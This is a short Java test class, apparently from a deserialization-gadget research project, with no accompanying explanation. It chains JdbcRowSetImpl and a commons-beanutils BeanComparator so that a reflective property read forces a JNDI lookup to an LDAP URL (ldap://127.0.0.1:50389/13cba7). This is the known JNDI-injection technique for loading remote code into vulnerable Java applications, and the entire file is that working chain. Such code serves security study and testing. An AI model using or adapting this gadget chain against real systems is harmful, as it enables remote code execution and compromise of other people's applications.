package org.example.gadget;

import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.sql.SQLException;

import static org.example.gadget.Test01.setField;

public class Test02 {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/13cba7");
        BeanComparator<Object> beanComparator = new BeanComparator<>();
        setField(beanComparator, "property", "databaseMetaData");
        beanComparator.compare(jdbcRowSet, jdbcRowSet);
    }
}
